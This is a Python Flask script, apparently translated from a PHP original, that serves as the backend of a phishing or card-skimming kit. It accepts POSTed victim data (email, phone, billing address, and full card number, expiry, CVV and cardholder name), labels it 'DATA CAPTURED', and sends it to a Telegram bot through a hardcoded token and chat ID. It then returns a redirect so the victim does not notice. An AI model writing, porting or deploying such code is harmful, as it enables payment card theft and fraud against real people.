from flask import Flask, request, jsonify
import requests
from datetime import datetime

app = Flask(__name__)

# Telegram credentials (hardcoded as in original)
TG_TOKEN = "8887451622:AAGGo0bZSUKjMPWIqRd5fWY_OvLZajnvee0"
TG_CHAT  = "8653611398"

@app.route('/', methods=['POST'])
def webhook():
    # 1. Read and validate JSON input
    data = request.get_json()
    if not data:
        return jsonify({"error": "no data"})

    # 2. Gather client info
    ip = request.remote_addr or 'UNKNOWN'
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    # 3. Extract fields with defaults
    email = data.get('email', '')
    phone = data.get('phone', '')
    card = data.get('card', {})
    billing = data.get('billing_address', {})

    # 4. Build the Telegram message (preserves original formatting)
    msg = (
        f"** UPDATE - DATA CAPTURED\n"
        f"#TIME# {timestamp} | 🌍 {ip}\n"
        f"●EMAIL● {email}\n"
        f"[PHONW] {phone}\n"
        f"^ADDY^ {billing.get('street', '')}, {billing.get('city', '')}, "
        f"{billing.get('state', '')} {billing.get('zip', '')}\n"
        f"■CPAN■ Card: {card.get('number', '')} | Exp: {card.get('expiry', '')} | "
        f"CVV: {card.get('cvv', '')} | Name: {card.get('name', '')}"
    )

    # 5. Send to Telegram (non‑blocking, errors ignored like the original @curl_exec)
    try:
        url = f"https://api.telegram.org/bot{TG_TOKEN}/sendMessage"
        payload = {
            'chat_id': TG_CHAT,
            'text': msg,
            'parse_mode': 'HTML'
        }
        requests.post(url, data=payload, timeout=5)
    except Exception:
        pass  # silently ignore

    # 6. Respond with JSON
    return jsonify({"status": "ok", "redirect": "/account"})

if __name__ == '__main__':
    app.run(debug=True)   # Remove debug=True in production
